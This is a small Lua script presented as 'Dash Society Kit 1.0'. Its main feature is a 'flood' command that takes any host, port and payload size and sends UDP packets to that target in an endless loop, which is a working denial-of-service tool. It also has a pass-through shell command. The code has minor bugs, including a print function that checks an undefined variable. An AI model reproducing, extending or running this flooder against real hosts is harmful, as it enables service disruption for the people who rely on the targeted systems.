
-- Dash Society is a client for any operating system
-- that has LUA 5.2 installed.

-- Author: Dashie
-- Version: 1.0


function print(message, mode)
    if mode == "info" then
        mode = "[info]: "

    elseif command == "error" then
        mode = "[error]: "
    end

    io.write(mode .. message .. "\n")
end


function get_os()
    if package.config:sub(1, 1) == "\\" then
        return "Windows"
    else
        return "Linux"
    end
end


function cmd(command)
    if command == "cls" then
        if get_os() == "Linux" then
            os.execute("clear")
        else
            os.execute("cls")
        end
    elseif command == "flood" then
        local host, port, bytes

        io.write("[Host]$ ")
        host = io.read()
        io.write("[Port]$ ")
        port = io.read()
        io.write("[Bytes]$ ")
        bytes = io.read()

        print("Generating data ....", "info")

        local data = bytes;

        for k = 0, bytes - 1 do
            data = data .. bytes
        end

        print("Generated data!", "info")

        local sock = require("socket")

        print("Poisoning target ....", "info")

        while true
        do
            local cl = assert(sock.udp())

            cl:settimeout(0)

            assert(cl:setpeername(host, port))
            assert(cl:send(data))

            cl:close()
        end

    elseif command == "sh" then
        print("A session has been summoned!", "info")
        print("Type \'!bye\' at any time to quit.", "info")

        while true
        do
            io.write("(shell> ")

            local c = io.read()

            if c == "!bye" then
                break
            end

            os.execute(c)
        end
    elseif command == "reset" then
        main()
    else
        print("Command not recognized.", "error")
    end
end


function main()
    cmd("cls")

    print("Welcome to Dash Society Kit 1.0 !", "info")
    print("Type \'?\' for help.", "info")

    while true
    do
        io.write("(Dash Society)> ")
        cmd(io.read())
    end
end


main()
